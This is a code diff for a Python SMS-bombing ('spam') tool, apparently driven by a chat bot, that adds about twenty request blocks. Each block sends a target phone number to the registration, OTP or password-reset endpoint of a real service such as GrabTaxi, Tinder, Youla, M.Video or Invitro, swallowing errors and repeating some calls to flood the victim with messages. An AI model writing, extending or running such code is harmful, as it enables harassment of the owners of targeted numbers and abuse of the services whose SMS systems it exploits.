@@ -333,7 +333,97 @@ def send_for_number(phone):
                       headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": phone})
     except:
         print('-')
-
+    try:
+        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}, headers={
+                      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
+    except:
+        pass
+    try:
+        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html',
+                      data={'l': phone}).json()["res"]
+    except:
+        pass
+    try:
+        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html',
+                      data={'l': phone}).json()["res"]
+    except:
+        pass
+    try:
+        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
+                      data={'phone_number': phone}, headers={})
+    except:
+        pass
+    try:
+        requests.post('https://app.karusel.ru/api/v1/phone/',
+                      data={'phone': phone}, headers={})
+    except:
+        pass
+    try:
+        requests.post('https://api.mtstv.ru/v1/users',
+                      json={'msisdn': phone}, headers={})
+    except:
+        pass
+    try:
+        requests.post('https://youla.ru/web-api/auth/request_code',
+                      data={'phone': phone})
+    except:
+        pass
+    try:
+        requests.post('https://youla.ru/web-api/auth/request_code',
+                      data={'phone': phone})
+    except:
+        pass
+    try:
+        requests.post('https://www.rabota.ru/remind',
+                      data={'credential': phone})
+    except:
+        pass
+    try:
+        requests.post('https://rutube.ru/api/accounts/sendpass/phone',
+                      data={'phone': '+'+phone})
+    except:
+        pass
+    try:
+        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
+                      data={'name': _name, 'phone': phone, 'promo': 'yellowforma'})
+    except:
+        pass
+    try:
+        requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+phone+'&country_code=%2B7&nod=4&locale=en')
+    except:
+        pass
+    try:
+        requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': phone,'g-recaptcha-response': '','recaptcha': 'on'})
+    except:
+        pass
+    try:
+        requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': phone, 'typeKeys': [
+                      'Unemployed']}}, 'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
+    except:
+        pass
+    try:
+        requests.post(
+            'https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone})
+    except:
+        pass
+    try:
+        requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
+                      json={'client_type': 'personal', 'email': '_email', 'mobile_phone': phone, 'deliveryOption': 'sms'})
+    except:
+        pass
+    try:
+        requests.post(
+            'https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone})
+    except:
+        pass
+    try:
+        requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':phone},'id':'1'})
+    except:
+        pass
+    try:
+        requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':phone},'id':'1'})
+    except:
+        pass
 
 async def start_spam(chat_id, phone_number, force):
     running_spams_per_chat_id.append(chat_id)
